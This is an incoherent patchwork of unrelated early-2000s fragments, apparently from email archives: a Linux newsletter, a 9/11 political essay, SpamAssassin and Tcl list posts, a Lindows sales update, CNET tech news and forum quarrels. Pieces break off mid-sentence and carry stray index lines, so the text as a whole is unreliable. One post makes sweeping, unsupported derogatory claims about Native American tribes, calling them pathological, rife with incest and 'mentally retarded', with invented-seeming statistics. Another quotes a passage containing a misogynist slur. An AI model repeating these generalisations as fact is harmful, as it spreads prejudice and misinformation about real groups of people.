 above links to join the ever-growing bandwagon. Do me a favor, though. keep the 
 subject lines intact. It's the only way your messages will filter and sort 
 through my email system.<p>
 
 It looks like Apple may have crossed a line of irritation with its users. 
 According to <a href=""http://theregister.co.uk/content/4/26269.html"" 
 target=""_blank"">this</a> article on <a href=""http://theregister.co.uk/"" 
 target=""_blank"">The Register</a>, Apple has tacked a $100 annual fee on its
 previously free mac.com email service. It's also set the price for an OS 10.2
 upgrade at $129.<p>
 
 I won't question Apple's decision too much. Instead, it really proves how 
 difficult things have become in the tech world in the past few years. Revenues, 
 by and large, are still decreasing from the pie-in-the-sky late 90s and early 
 2000. That's left companies to scramble for new sources of income, some of which 
 
 
 
 
 were previously free. Even we at Lockergnome have felt the pinch in the past few 
 
 
 
 
 years. Never fear, though. Chris has assured us that the newsletters will remain 
 
 
 
 
 free. We have, however, begun to explore alternative income <a 
 href=""http://www.gnometomes.com/"" target=""_blank"">sources</a>.<p>
 
 On a brighter note, it looks like <a href=""http://www.mandrake.com/"" 
 target=""_blank"">Mandrake</a> has found a sweet spot. According to their most 
 recent shareholder's report, the third quarter was the strongest in the 
 company's
 history, with 1.6 million Euro (1.61 million US) in revenue. That doesn't put
 them in the black, though. According to MandrakeSoft, the strong quarter will
 only decrease operating losses. I have to wonder how much of this revenue was
 the result of the <a
 href=""http://mandrakelinux.com/en/club/""target=""_blank"">Mandrake Linux User's
 Club</a>.<p>
 
 The news also makes me want to pay a bit more attention to Mandrake's newest
 partnership venture, an agreement with <a href=""http://www.microtel.com/""
 target=""_blank"">Microtel</a> to provide Mandrake-loaded computers for sale on <a
 href=""http://www.walmart.com/catalog/product_listing.gsp?cat=102252&dept=3944&path=0%3A3944%3A3951%3A41937%3A86796%3A102252"" target=""_blank"">WalMart.com</a>.
 I would never have guessed that WalMart would lead the consumer Linux machine
 charge. They've had Mandrake boxes available for several months. Now, with the 
 addition of both <a href=""http://www/lindows.com/"" target=""_blank"">Lindows</a> 
 and Mandrake-equipped computers, they seem surprisingly ahead of the retail 
 computer pack. Let's hope for the best for all involved.<p>
 
 Have a great Wednesday.<p><p>

 <b>Checking Mail With KMail</b><p>
 
 I've recently become a KDE convert - impressed enough with KDE-3 to move me from 
 
 my longtime desktop friend Gnome. While I use a combination of fetchmail, 
 procmail and pine for reading and filtering my email, KMail is a strong 
 contender in the email race. As you'd guess, it's fully integrated into the KDE 
 desktop, ready for a quick setup and easy use.<p>
 
 There's one drawback to KMail, though, in my opionion. That's that it doesn't 
 automatically check your email by default when the program is opened. As much 
 time as I spend talking about saving key and mouse strokes, you knew the 
 additional step to check your email after opening the program would be an 
 irritation to this Penguin. However, changing the problem is a quick and simple 
 configuration issue.<p>
 
 To force KMail to check your email when opened, right-click on the KMail icon in 
 
 your KDE panel. Select ""Preferences"" and the ""Execute"" tab. In the Execute 
 window, change the command line to read:<p>
 
 &nbsp;&nbsp;&nbsp;&nbsp;kmail --check -caption ""%c"" %i %m<p>
 
 The addition of the --check option will force KMail to bring you your mail when 
 you open the program.<p>
 
 Fewer keystrokes make a happy geek, right?<p> <p>

 <b>Kernel Configuration - Part XIII</b><p>
 
 As you well know, Linux is simply the most robust operating system for 
 networking around. With its roots squarely in the network, Linux has managed to 
 stay ahead of the pack in virtually every respect related to networks. It should 
 
 come as little suprise, then, that the network section of your Linux kernel 
 configuration is dense with details and options.<p>
 
 I will say that I warned you on Monday - there are going to be some sections of 
 the kernel configuration series where I just can't give you a stock 
 configuration that will work in every case. Networking is one of those areas. 
 You're going to have to give some thought as to how your network is or will be 
 used and the level of security you want to provide (both internal and external). 
 
 Then, it's a matter of finding the solutions to those options.<p>
 
 For security issues, I can recommend several good articles and HowTos:<p>
 
 <a class=""url"" 
 href=""http://www.linux.org/docs/ldp/howto/Security-Quickstart-HOWTO/index.html"">The Linux Security Quickstart HowTo</a><br>
 &nbsp;&nbsp;covers security on a high level, with a good discussion of kernel 
 configuration issues<p>
 
 <a class=""url"" href=""http://www.linuxplanet.com/linuxplanet/tutorials/211/1/"" 
 target=""_blank"">Linux Network Security from Linux Planet</a><br>
 &nbsp;&nbsp;a nice tutorial on network security<p>

 target=""_blank"">Network Security with /proc/sys/net/ipv4</a><br>
 &nbsp;&nbsp;other approaches to network security<p>
 
 
 These should get you started. Tomorrow, we'll cover telephony support in your 
 Linux kernel.<p><p>

 If the daily Linux news sites are starting to get you down, maybe it's time for 
 a change. Linux PR is an up-to-the-minute listing of events and developments in 
 the Linux world. The layout is attractive, with all the most recent articles in 
 descending order on the front page. It makes quick scans easy. The only real 
 downside to the news on the site is that some of it is very, very 
 company-oriented - clearly the work of PR firms cranking out press releases. 
 Other than that, Linux PR is a useful site for checking in and keeping up on 
 your favorite OS.<p><p>

 September 11, 2002 8:00 a.m.
 The Wages of September 11
 There is no going back.
 
 
 
 September 11 changed our world. Those who deny such a watershed event take a
 superficially short-term view, and seem to think all is as before simply
 because the sun still rises and sets.
 
 This is a colossal misjudgment. The collapse of the towers, the crashing
 into the Pentagon, and the murder of 3,000 Americans  all seen live in real
 time by millions the world over  tore off a scab and exposed deep wounds,
 which, if and when they heal, will leave ugly scars for decades. The killers
 dealt in icons  the choice of 911 as the date of death, targeting the
 manifest symbols of global capitalism and American military power, and
 centering their destruction on the largest Jewish city in the world. Yes,
 they got their symbols in spades, but they have no idea that their killing
 has instead become emblematic of changes that they could scarcely imagine.
 
 Islamic fundamentalism has proved not ascendant, but static, morally
 repugnant  and the worst plague upon the Arab world since the Crusades. By
 lurking in the shadows and killing incrementally through stealth, the
 vampirish terrorists garnered bribes and subsidies through threats and
 bombs; but pale and wrinkled in the daylight after 9/11, they prove only
 ghoulish not fearsome.
 
 The more the world knows of al Qaeda and bin Laden, the more it has found
 them both vile and yet banal  and so is confident and eager to eradicate
 them and all they stand for. It is one thing to kill innocents, quite
 another to take on the armed might of an aroused United States. Easily
 dodging a solo cruise missile in the vastness of Afghanistan may make good
 theater and bring about braggadocio; dealing with grim American and British
 commandos who have come 7,000 miles for your head prompts abject flight and
 an occasional cheap infomercial on the run. And the ultimate consequence of
 the attacks of September 11 will not merely be the destruction of al Qaeda,
 but also the complete repudiation of the Taliban, the Iranian mullocracy,
 the plague of the Pakistani madrassas, and any other would-be fundamentalist
 paradise on earth.
 
 Foreign relations will not be the same in our generation. Our coalition with
 Europe, we learn, was not a partnership, but more mere alphabetic
 nomenclature and the mutual back scratching of Euro-American globetrotters 
 a paper alliance without a mission nearly 15 years after the end of the Cold
 War. The truth is that Europe, out of noble purposes, for a decade has
 insidiously eroded its collective national sovereignty in order to craft an
 antidemocratic EU, a 80,000-person fuzzy bureaucracy whose executive power
 is as militarily weak as it is morally ambiguous in its reliance on often
 dubious international accords. This sad realization September 11 brutally
 exposed, and we all should cry for the beloved continent that has for the
 moment completely lost its moral bearings. Indeed, as the months progressed
 the problems inherent in ""the European way"" became all too apparent:
 pretentious utopian manifestos in lieu of military resoluteness, abstract
 moralizing to excuse dereliction of concrete ethical responsibility, and
 constant American ankle-biting even as Europe lives in a make-believe Shire
 while we keep back the forces of Mordor from its picturesque borders, with
 only a few brave Frodos and Bilbos tagging along. Nothing has proved more
 sobering to Americans than the skepticism of these blinkered European
 hobbits after September 11.
 
 America learned that ""moderate"" Arab countries are as dangerous as hostile
 Islamic nations. After September 11, being a Saudi, Egyptian, or Kuwaiti
 means nothing special to an American  at least not proof of being any more
 friendly or hostile than having Libyan, Syrian, or Lebanese citizenship.
 Indeed, our entire postwar policy of propping up autocracies on the triad of
 their anticommunism, oil, and arms purchases  like NATO  belongs to a
 pre-9/11 age of Soviet aggrandizement and petroleum monopolies. Now we learn
 that broadcasting state-sponsored hatred of Israel and the United States is
 just as deadly to our interests as scud missiles  and as likely to come
 from friends as enemies. Worst-case scenarios like Iran and Afghanistan
 offer more long-term hope than ""stable regimes"" like the Saudis; governments
 that hate us have populations that like us  and vice versa; the Saudi royal
 family, whom 5,000 American troops protect, and the Mubarak autocracy, which
 has snagged billions of American dollars, are as afraid of democratic
 reformers as they are Islamic fundamentalists. And with good reason: Islamic
 governments in Iran and under the Taliban were as hated by the masses as
 Arab secular reformers in exile in the West are praised and championed.
 
 The post-9/11 domestic calculus is just as confusing. Generals and the
 military brass call civilians who seek the liberation of Iraq ""chicken
 hawks"" and worse. Yet such traditional Vietnam-era invective I think rings
 hollow after September 11, and sounds more like McClellan's shrillness
 against his civilian overseers who precipitously wanted an odious slavery
 ended than resonant of Patton's audacity in charging after murderous Nazis.
 More Americans were destroyed at work in a single day than all those
 soldiers killed in enemy action since the evacuation of Vietnam nearly 30
 years ago. Indeed, most troops who went through the ghastly inferno of
 Vietnam are now in or nearing retirement; and, thank God, there is no
 generation of Americans in the present military  other than a few thousand
 brave veterans of the Gulf, Mogadishu, and Panama  who have been in
 sustained and deadly shooting with heavy casualties. Because American
 soldiers and their equipment are as impressive as our own domestic security
 is lax, in this gruesome war it may well be more perilous to work high up in
 lower Manhattan, fly regularly on a jumbo jet, or handle mail at the
 Pentagon or CIA than be at sea on a sub or destroyer.
 
 Real concern for the sanctity of life may hinge on employing rather than
 rejecting force, inasmuch as our troops are as deadly and protected abroad
 as our women, children, aged, and civilians are impotent and vulnerable at
 home. It seems to me a more moral gamble to send hundreds of pilots into
 harm's way than allow a madman to further his plots to blow up or infect
 thousands in high-rises.
 
 Politics have been turned upside down. In the old days, cynical
 conservatives were forced to hold their noses and to practice a sometimes
 repellent Realpolitik. In the age of Russian expansionism, they were loathe
 to champion democracy when it might usher in a socialist Trojan Horse whose
 belly harbored totalitarians disguised as parliamentarians. Thus they were
 so often at loggerheads with nave and idealist leftists.
 
 No longer. The end of the specter of a deadly and aggressive Soviet
 Communism has revived democratic ideology as a force in diplomacy. Champions
 of freedom no longer sigh and back opportunistic rightist thugs who promise
 open economics, loot their treasuries, and keep out the Russians. Instead,
 even reactionaries are now more likely to push for democratic governments in
 the Middle East than are dour and skeptical leftists. The latter, if
 multiculturalists, often believe that democracy is a value-neutral Western
 construct, not necessarily a universal good; if pacifists, they claim
 nonintervention, not justice, as their first priority. The Right, not the
 Left, now is the greater proponent of global freedom, liberation, and
 idealism  with obvious domestic ramifications for any Republican president
 astute enough to tap that rich vein of popular support.
 
 All this and more are the wages of the disaster of September 11 and the
 subsequent terrible year  and yet it is likely that, for good or evil, we
 will see things even more incredible in the twelve months ahead.

 As a new user of SA, I guess I'm having trouble connecting the dots.  If 
 I understand you:  If I don't use the ""nomime"" => 1 option and I recieve 
 MIME mail, the Mail::Internet modules become unavailable.
 
 Unavailable for which?  MA?  SA?  What do these methods do?  Does this 
 mean my incoming MIME mail won't be checked by SA unless I specify 
 ""nomime"" => 1?
 
 Thanks,
 Phil

 Mmkay.  For the nth time Adam, we don't live in the land of
 Adam-fantasy.  Women actually are allowed to do things productive,
 independent and entirely free of their male counterparts.  They aren't
 forced to cook and clean and merely be sexual vessels.   Sometimes,
 and this will come as a shock to you, no doubt, men and women even
 find -love- (which is the crucial distinction between this system) and
 they marry one another for the satisfaction of being together.   I
 know, far-fetched and idealistically crazy as it is, but such things
 do happen.   I can guarantee you, if my mother was approached by my
 father, and 25 years ago, he commented on her cleaning ability as a
 motivator for marrying her, we would not be having this conversation
 now.
 
 If guys still have silly antequated ideas about 'women's role' then
 their opportunities for finding women _will_ be scarce.   Again, these
 situations are great, provided everyone is aware that the relationship
 is a contractual one -- he wants a maid, a dog and a prostitute he
 doesn't have to pay, and she wants a country that isn't impoverished
 and teeming with AIDS.  A contract, versus a true love-interest
 marriage.
 
 Egh.  I really need to stop analyzing your posts to this extent.   I
 blame law school and my cat.

 But RAM is expensive, and the directory structures of many systems (e.g.
 Windows) are not sufficiently organized and standardized to make this
 combination of bootable CDs and RAM drives practical. Even if you are
 fortunate enough to be using Linux (or another FHS-compliant *nix), you
 still can't fit a lot on a CD. Its not unusual today to have gigabytes of
 static multimedia content on the web server. This particular problem can be
 alleviated somewhat by using DVDs, but this is a temporary solution at best
 which will become outdated quickly as our data requirements grow and hard
 drives become cheaper.

 Right. This is why you would consolidate all state of any long-term
 significance on just a couple partitions, and why you would not put static
 application code on these changeable partitions. Fortunately, most large
 client/server application physical architectures do this anyhow, because
 these are two fundamentally different kinds of state with two very different
 sets of administrative, security, RAID, and backup requirements. People also
 tend to do this anyhow because layered logical architectures are popular
 with the GUI at one end, business logic in the middle, and persistence
 services at the other. This logical architecture maps naturally to a
 physical architecture that has a static web server, a static application
 server, and a database server that has static and changeable partitions. (I
 use the word static versus changeable instead of writeable versus unwritable
 because the ""unchangeable"" partitions might be written to for temporary swap
 space. Who knows what Windows does internally?)
 
 My point is that there should be a market out there for a hardware RAID
 device that can split designated partitions into a permanent base image
 partition and a temporary delta image partition, that has some simple but
 solid security measures to prevent the unauthorized remote modification of
 base images, and that can be configured to clear the delta image when the
 server is rebooted. If some vendor wished to implement this, they could then
 market this as a mechanism to help frustrate broad classes of attack that
 rely on the permanent modification of system or application files via buffer
 overflows, platform and middleware bugs, etc. The prevention of unauthorized
 modification of application data, of course, would not be addressed by this
 particular product. But there are many other techniques out there to defend
 application data. But those techniques all assume that your system itself
 has not been compromised at a lower level, which is where this product could
 help.
 
 I would have to think that these features would be relatively easy for a
 hardware RAID vendor to implement. (I'm just guessing, of course, with no
 knowledge of how hardware RAID works internally.) If anyone knows of such a
 product, I'd love to hear about it.

 Eh?!? Oh wait... <pause while original mail is re-read>
 
 Doh. Sorry, I automatically read 'soft' in front of 'links', despite all
 evidence to the contrary. I thought the original question was a bit
 strange...
 
 On that note: is there any real benefit to using hard links? I avoid them as
 a rule, and cannot think of any good reason to use them at the moment.

 I'm gonna fix this one. I think the best solution will be to copy the modified

 changed on build time and not install time, too.

 I am not using procmail because this [cluster of] server is a gateway on to

86,"Subject: Native American economics (was Re: sed /s/United States/Roman
","
 I wanted to get back to this but didn't have the time.  I actually lived on
 a couple different Indian reservations growing up in the Pacific Northwest
 and also spent a fair amount time in Lakota/Sioux country as well.  And my
 parents have lived on an even more diverse range of Indian reservations than
 I have (my experience being a direct result of living with my parents).  I
 do get a lot of my information first-hand, or in some cases, second-hand
 from my father.
 
 The income figures for the Indians are somewhat misleading, mostly because
 it is really hard to do proper accounting of the effective income.  While it
 is true that some Indians live in genuine poverty, it is typically as a
 consequence of previous poor decisions that were made by the tribe, not
 something that was impressed upon them.
 
 The primary problem with the accounting is that there is a tribal entity
 that exists separately from the individuals, typically an ""Indian
 Corporation"" of one type or another where each member of the tribe owns a
 single share (the details of when and how a share becomes active varies from
 tribe to tribe).  In most tribes, a dividend is paid out to each of the
 tribal members from the corporation, usually to the tune of $10-30k per
 person, depending on the tribe.  The dividend money comes from a number of
 places, with the primary sources being the Federal Gov't and various
 businesses/assets owned by the Indian corporation.
 
 You have to understand a couple things:  First, a great many Indian tribes
 are run as purely communist enterprises.  Everyone gets a check for their
 share no matter what.  One of the biggest problems this has caused is very
 high unemployment (often 70-90%) for tribal members, who are more than happy
 take their dividend and not work.  The dividend they receive from the
 corporation often constitutes their sole ""income"" for government accounting
 purposes.  Unfortunately, to support this type of economics when no one
 works, they've had to sell off most of their useful assets to maintain those
 dividends.  Many of the tribes genuinely living in poverty do so because
 they have run out of things to sell yet nobody works.  One of the ironies is
 that on many of the reservations where the tribes still have assets to burn,
 many of the people working in the stores and such are actually poor white
 folk, not Indians.
 
 Second, even though the tribe members each get a cash dividend, they also
 receive an enormous range of benefits and perks from the Indian corporation
 to the tune of tens of thousands of dollars per person annually.  By
 benefits and perks, we are talking about the kinds of things no other
 ordinary American receives from either their employer or the government.
 
 It should be pointed out that while many of these Indian corporations are
 ineptly run, and mostly provide sinecures for other Indians, a minority are
 very smartly managed and a few hire non-Indian business executives with good
 credentials to run their business divisions.  An example of this is the
 Haida Corporation, which while having less 1,000 tribal shareholders, has
 billions of dollars in assets and the various corporations they own have
 gross revenues in the $200-300 million range (and growing).  Yet the
 dividend paid out is strictly controlled, about $20k in this particular
 case, and they engaged in a practice of waiting a couple decades before
 drawing money from any of the assets they were granted which has led to
 intelligent investment and use.  They don't eat their seed corn, and have
 actually managed to grow their stash.  In contrast, a couple islands over,
 there is another tribe of ~2,000 people that has a net loss of about $50
 million annually IIRC while being regularly endowed by the Federal
 government with several billions of dollars in valuable assets.  This
 particular tribe has a modest income in theory, but the actual expenditures
 per person annually is in the hundreds of thousands of dollars, and many
 borrow money against future income.  Incidentally, in this particular case,
 the people that ARE working frequently pull in a few hundred thousand
 dollars a year, much of which goes back to the tribal corporation rather
 than their own pockets.
 
 Somewhat annoying, the Federal government semi-regularly grants valuable
 assets to these tribes when they've burned through the ones previously given
 where feasible, typically selling the assets to American or foreign
 companies.  And the cycle continues.
 
 So what is the primary problem for the tribes that have problems?  In a
 nutshell, a thoroughly pathological culture and society.
 
 Few women reach the age of 16 without getting pregnant.  Incest, rape, and
 gross promiscuity is rampant.  Inbreeding, heavy drug abuse during
 pregnancy, and other environmental factors have created tribes where a very
 substantial fraction of the tribe is literally mentally retarded.  Many of
 the thoughtful and intelligent tribe members leave the reservation at the
 earliest opportunity, mostly to avoid the problems mentioned above.  On one
 reservation my parents lived, the HIV infection rate was >70%.  Many of
 these societies are thoroughly corrupt, and the administration of the law is
 arbitrary and capricious (they do have their own judges, courts, police
 etc).
 
 In short, many of these tribes that are still hanging together are in a
 shambles because they have become THE most pathological societies that I
 have ever seen anywhere.  Because of their legal status, there really aren't
 that many consequences for their behavior.  There are many things that I
 could tell you that I've seen that you probably would not believe unless
 you'd seen it yourself.  There are always good people in these tribes, but
 it has gotten to the point where the losers and idiots outnumber the good
 guys by a fair margin many times, and this IS a mobocracy typically.  (BTW,
 if any of you white folk wants to experience overt and aggressive racism as
 a minority in a place where the rule of law is fiction and the police are
 openly thugs, try living on one of these messed up Indian reservations.  It
 will give you an interesting perspective on things.)
 
 There are only two real situations where you find reasonably prosperous
 Indians.  The first is in the rare case of tribes run by disciplined and
 intelligent people that have managed their assets wisely.  The second is
 where the tribe has dispersed and assimilated for the most part, even if
 they maintain their tribal identity.  In both of these cases, the tribal
 leaders reject the insular behavior that tends to lead to the pathological
 cases mentioned above.
 
 The Indians are often quite wealthy technically, and a lot of money is spent
 by the tribe per capita.  And the actual reportable income is quite high
 when you consider how many are living entirely off the tribal dole.  It is
 just that their peculiar economic structure does not lend itself well to
 ordinary economic analysis by merely looking at their nominal income.  The
 poverty is social and cultural in nature, not economic.  This was my
 original point.
 
 
 On a tangent:
 
 One thing that has always interested me is the concept of quasi-tribal
 corporate socialism.  Many Indian tribes implement a type of corporate
 socialism that is mind-bogglingly bad in execution.  That they use this
 structure at all is an accident of history more than anything.  But what has
 interested me is that the very smartly managed ones do surprisingly well
 over the long run.  It is like a Family Corporation writ large.
 
 It seems that in a future where ""familial"" ties will be increasingly
 voluntary, the general concept may have some merit in general Western
 society, serving to create a facsimile of a biological extended family with
 the included dynamics, but with an arbitrary set of self-selecting
 individuals.
 
 Damn that was long (and its late), and it could have been a lot longer.

 Very reminiscent indeed.  Ayatollah Chirac has decreed a death
 sentence on Houellebecq and liked-minded fundamentalists have offered
 millions of euros bounty for his head, so he has gone into hiding
 under police protection for a few years.
 
 Or maybe some handful of Muslims are acting uppity and dragging him to
 court under ""hate speech"" laws make a point about people not showin'
 dem da massive respect dat dey deserve, especially these days.
 
 Or maybe some journo is trying to fill column inches on a boring day.
 
 
 BTW I read Houellebecq's ""Extension du domaine de la lutte"" recently,
 about a depressed computer services dude working in Paris, looking for
 love and not finding it, slowing losing his marbles and trying to get
 a friend of his to kill a woman, and ending up in a clinic for
 nutcases...  Yikes!  Purposely provocative, very depressing, with some
 unbelievably boring passages where the anti-hero writes little stories
 about animals talking philosophical mumbo-jumbo to each other, quoted
 inline in full for pages on end.
 
 It starts out:
 
 ""On Friday evening, I was invited to a party with some colleagues from
 work.  There were about thrity of us, all professionals aged from
 twenty-five to forty.  At one point, some cunt started getting
 undressed. She took off her T-shirt, then her bra, then her skirt, all
 the while making unbelievable faces.  She pranced around for a few
 seconds, then she started getting dresesd again because she didn't
 know what else to do.  Anyway she never sleeps with anyone.  Which
 underlines the absurdity of her behaviour.
 
 After my fourth glass of vodka I started to feel pretty bad so I had
 to go lie down on a bunch of cushions behind the couch.  Shortly after
 that, two girls came and sat on the couch.  Those girls are not pretty
 at all, the two fat office cows actually.  They go to eat together and
 read books about the development of language in children, all that
 sort of stuff.""
 
 ... and it's downhill from there!

 I just had to jump in here as Carbonara is one of my favourites to make and ask 
 what the hell are you supposed to use instead of cream?  I've never seen a 
 recipe that hasn't used this.  Personally I use low fat creme fraiche because it 
 works quite nicely but the only time I've seen an supposedly authentic recipe

 except for the creme fraiche.

 Michael's Minute: 
 Lindows.com Report Card 
 
 As summer arrives, many school children are coming home with their
 report cards.  I thought this would be a good time to see what kind of
 grades Lindows.com received for their first 9 months in operation..
 
 <http://lindows.com/timeline> 
 To view the Timeline of Lindows.com's first 9 months in business, click
 here <http://lindows.com/timeline> . 
 
 Operating System:  
 
 As of last week, consumers can experience LindowsOS in one of two ways.
 One way is to buy a computer running LindowsOS from Walmart.com
 <http://www.lindows.com/walmart> , for as little as $299. This is a
 significant milestone for us, as we've partnered with our first builder
 (Microtel) and retailer (Walmart). These computers work great out of the
 box and are ideal for general purpose computing tasks. 
 
 For those who already have a computer and also wish to try LindowsOS, we
 offer the Insider program <http://www.lindows.com/signup> . This gives
 people wanting early access to LindowsOS a chance to try out LindowsOS
 as it develops. Currently, Insiders report installation success about
 80%  of the time on their PCs. Therefore we have some room to grow,
 consequently, this product is not yet for everyone. 
 
 Some may wonder how we can sell a computer at Walmart
 <http://www.lindows.com/walmart> when the program available directly
 from Lindows.com is billed as not completely ready. The difference is
 the Walmart <http://www.lindows.com/walmart>  computers are certified,
 ensuring that all components  work elegantly with LindowsOS. That's much
 different than offering a software program that will work on any
 computer in the world - that's very difficult. It's the difference
 between making a single pair of shoes for a known foot size versus
 opening a shoe store with every style of shoe for every size foot. The
 first one is easy, the second one is a much bigger job.
 
 While the installer is fantastically easy and fast (the entire OS
 installs in under 5 minutes), we've got a lot more work to do to support
 a wider range of hardware, printers and other devices. Grade:  B
   _____  
 
 Software: 
 
 Our goal to give people choice means giving them choice not just on
 their operating system, but access to all the programs they'll want to
 add to their computer to really make it work for them in their school,
 home or business.
 
 Click-N-Run <http://www.lindows.com/clicknrun>  is the easiest way to
 load software onto a computer. For the first time a Linux based system
 has leapt ahead of Microsoft's operating systems in ease of use. With
 1,000 plus programs already in the Click-N-Run Warehouse
 <http://www.lindows.com/warehouse> , users can find quality software
 titles for just about any computing task and, with a single mouse-click
 download, install and run these programs. All these titles are included
 in the $99. This is a fantastic consumer experience and price point.
 Look for a lot more great software in the Warehouse in the future.
 Grade: A-
   _____  
 
 Microsoft Windows Compatibility:
 
 We live in a Microsoft world, so there needs to be a bridge from the
 legacy world to the broadband LindowsOS world. This means we need to
 support some bridge programs, file types and network devices to help
 people interact with the legacy Microsoft world. LindowsOS computers
 come with software to view, print and copy popular Microsoft
 applications like: MS Word files, MS PowerPoint files and MS Excel
 documents. There's great Linux based alternatives and we'll guide people
 to those alternatives (they're better than most people realize). To edit
 Microsoft files, we'd highly recommend one of the office suites in our
 Warehouse such as OpenOffice
 <http://www.lindows.com/lindows_products_details.php?id=8966> . 
 
 Many of these programs are of very high-quality and a great value since
 they're included in the Warehouse <http://www.lindows.com/warehouse> .
 Sometimes there are no viable alternatives for those programs, so we're
 investing necessary resources to support some Microsoft Windows based
 programs. Stay tuned for more developments in this area. Our printer
 support is ok, but there's lots of room for more drivers. Connecting to
 MS Windows based file servers is still a challenge. We need to get
 better in the above areas.  Grade: B 
   _____  
 
 Communication:
 
 We've tried to be diligent in communicating where our company is going
 which is why there's typically a weekly Michael's Minute
 <http://www.lindows.com/mm> . While our overall goal has not deviated -
 Bringing Choice To Your Computer - our implementation has become more
 focused as we listened to what our Insiders and potential customers have
 told us. (Keep sending me your comments.) We have been de-emphasizing
 running Microsoft Windows programs because many of you told us you
 detest spending hundreds of dollars on individual software programs,
 forced upgrades and activation codes. It's not just the operating
 system, but costly Microsoft programs you're wanting to avoid. 
 
 Consequently, we've been emphasizing Click-N-Run because it will change
 the way you think about software. Having a neatly categorized library
 <http://www.lindows.com/warehouse>  of 1,000+ software titles all for a
 flat annual fee at your digital fingertips is an entirely new way to
 think about paying for software. It's immediate, elegant and affordable.
 
 There are lots of mischaracterizations about Lindows.com swirling around
 - which happens when you have a small organization which can't address
 every question or publication. We'll do a better job of addressing these
 in the future. For now, I wrote up answers to the Top Myths about
 Lindows.com. Check them out by visiting: www.lindows.com/myths  Grade:
 B+

 Overall: B+

 Bringing Choice to Your Computer! 
  
 LindowsOS is presently available on LindowsOS Certified Computers being
 offered from Lindows.com  <http://www.lindows.com/builder> Builder
 partners.  The General Release of LindowsOS (available now for download
 and preview to Lindows.com  <http://lindows.com/signup> Insider
 partners) will be made available later this year for those wishing to
 install and run LindowsOS on their existing computer hardware.  The
 General Release version will support a wider range of computer hardware
 and includes unique features such as a ""Friendly-Install"" alongside an
 existing MicrosoftR Windows operating system, a streamlined installation
 process which requires no computer knowledge, and the ability to run a
 select set of ""bridge"" Windows-compatible programs. For more information

102,"Subject: [Spambayes] Deployment
","
     Guido> Takers?  How is ESR's bogofilter packaged?  SpamAssassin?  The
     Guido> Perl Bayes filter advertised on slashdot?
 
 Dunno about the other tools, but SpamAssassin is a breeze to incorporate
 into a procmail environment.  Lots of people use it in many other ways.  For
 performance reasons, many people run a spamd process and then invoke a small
 C program called spamc which shoots the message over to spamd and passes the
 result back out.  I think spambayes in incremental mode is probably fast
 enough to not require such tricks (though I would consider changing the
 pickle to an anydbm file).
 
 Basic procmail usage goes something like this:
 
     :0fw
     | spamassassin -P
 
     :0
     * ^X-Spam-Status: Yes
     $SPAM
 
 Which just says, ""Run spamassassin -P reinjecting its output into the
 processing stream.  If the resulting mail has a header which begins
 ""X-Spam-Status: Yes"", toss it into the folder indicated by the variable
 $SPAM.
 
 SpamAssassin also adds other headers as well, which give you more detail
 about how its tests fared.  I'd like to see spambayes operate in at least
 this way: do its thing then return a message to stdout with a modified set
 of headers which further processing downstream can key on.

 I took a bit of time to review what is on the above URL.  If I were a news 
 editor, the headline would be:
 
 ""Inventor"" from country that ignores patents and copyrights, seeks patent for

 Well, I mentioned classifier and tokenize only because I thought they were
 the only importable modules.  The rest represent script-level code, right?

 That would be perfect.  I tried in the naive way last night, but wound up
 with all .py files in the package, which wasn't my intent.

106,"Subject: Re: Anolther sequence related traceback
","You can also duplicate thiswith
 
 MsgChange - noshow
 
 at the Tcl prompt in the Log window.  I suspect that the sequence
 parser, which understands things like 5-22 to mean messages 5 through 22
 is confused when asked to add/remove message ""-"" from a sequence.
 
 If we are allowed to assume 8.2 or higher, which we can't really, then
 we could add
 
 if {![string is integer $select(sel)]} {
    # bail out of message select mode
 }
 to the SelectTypein procedure.
 
 We can probably survive with
 
 if {![regexp {^[0-9]+$} $select(sel)]} {
     #bail out of message select mode
 }

 <b>Jobs touts OS X, iPods, iMac</b><br>
 <font size=""-1"">
 NEW YORK--Apple Computer CEO Steve Jobs on Wednesday defended the company's switch to the Mac OS X operating system and unveiled new iPod digital-audio players and a new flat-panel iMac.
 Jobs used his keynote speech at the Macworld trade show here to make a flurry of other announcements as well, such as details about new syncing software, the next update to OS X and the end of free iTools.
 
 The most dramatic announcement focused on iPod. The new players include ones built specifically for computers that use Microsoft's Windows operating system.

 <font size=""-1"">
 Internet consulting firm Scient has filed for Chapter 11 bankruptcy and agreed to sell certain assets to a professional services firm.
 The deal calls for Salt Lake City-based SBI to hire some of Scient's employees and to provide up to $4.9 million in financing, pending completion of the asset acquisition.
 
 Scient has been struggling for some time now. Once a dot-com darling, the company recently approved a 1-for-20 reverse stock split.
 
 
 
 
 The company and SBI said they expect the bankruptcy court to approve the deal, adding that financing ""will allow Scient to continue to deliver services to its clients without interruption until court approval of SBI's acquisition is received.""

 What does Yahoo Mail have against mocha?
 That's what users of the company's free e-mail service may be wondering if they try to send a message using the word ""mocha"" and discover that while in transit, ""mocha"" mysteriously changes to ""espresso.""
 
 To protect users from malicious code, Yahoo uses an automated filter to swap out a handful of words such as ""mocha"" that pertain to Web code known as JavaScript.
 
 
 
 
 The reason is that e-mail sent in a form known as ""Web enhanced"" can contain JavaScript instructions that can run programs on the recipient's PC. JavaScript is a Web language that can issue commands such as telling the browser to open up other windows or to prompt a service to change a password, for example.

 Unisys, a specialist in high-end servers, is coming out with a new lower-cost line of Intel-based servers as it gears up to promote the Itanium 2 chip.
 Unisys' new Aries servers accommodate as many as 16 Itanium 2 or Xeon processors and cost between $75,000 and $300,000, said Mark Fevertson, Unisys' vice president of server marketing. It joins the Orion line, which can use up to 32 Xeon or Itanium 2 processors and has been on sale for about two years at a cost between $140,000 and $700,000.

 With sales of its Office suite for Mac OS X falling short of projections, Microsoft plans on Wednesday to announce a rebate for those who buy the software bundle when they pick up a new Mac.
 The promotion, which runs through Sept. 30, entails a $50 mail-in rebate for people buying a new Mac and upgrading to Office v. X, and $100 for those buying a Mac and the full version of the software. Microsoft is also offering two new pieces of downloadable software: one that lets Palm handhelds synchronize directly with Office v. X and another that lets the Macintosh view programs running on a Windows PC or server.

 <font size=""-1"">
 ATI, once the leader in graphics chips, will launch its comeback bid this week with a new chip that experts say could put the company back in front in terms of performance.
 The Markham, Ontario-based company on Thursday will unveil the details of the Radeon 9700, a desktop graphics chip based on a new architecture that will provide greater realism when it comes to 3D images, according to sources.
 
 The fastest versions of the new chips will offer considerably higher performance than Nvidia's current GeForce4 roster, giving ATI the edge with gamers as well as PC makers, analysts said. And even after Nvidia--which began to chip away at ATI's leading spot in graphics in 1999--comes out with its GeForce 5 in a few months, the competition between the two will remain close.

